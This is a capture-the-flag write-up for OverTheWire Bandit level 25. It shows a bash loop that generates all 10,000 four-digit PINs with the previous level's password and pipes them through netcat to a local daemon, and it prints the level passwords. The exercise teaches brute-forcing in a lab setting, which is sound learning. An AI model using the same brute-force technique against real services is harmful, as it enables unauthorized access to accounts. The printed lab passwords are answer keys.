# Bandit level 25

# Objective
Use the password for the last level along with a numeric 4-digit code to get the password for this level from a daemon listening on port 30002

# Solution Steps
1. Log in to Bandit Server using ssh
    ssh bandit24@bandit.labs.overthewire.org -p 2220
2. Checked contents of directory
    ls
3. Found nothing, Ran daemon on port 30002
    nc localhost 30002
4. Prompted password for bandit24 along with 4-digit pin, found format for entering password and pin
    "I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space."
5. Made temp directory for making script and moved to that directory
    mkdir /tmp/script24
    cd /tmp/script24
6. Created shell script using nano
    nano script24.sh
7. Made script that loops through every combination of 0000 - 9999 along with bandit24 password and outputs it into a .txt file in correct format

    #!/bin/bash

    for i in {0..9}{0..9}{0..9}{0..9}
    do
            echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> pincodes.txt;
    done
8. Made script into an executable
    chmod +x script24.sh
9. Ran script
    ./script24.sh
10. Checked contents of directory
    ls
11. Found pincodes.txt file, checked contents of file against daemon using pipeline
    cat pincodes.txt | nc localhost 30002
12. Extracted password from output
    password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 
13. Removed directory for script
    cd ..
    rm -rf script24

# Learned
How to make a loop inside a shell script and use files in a pipe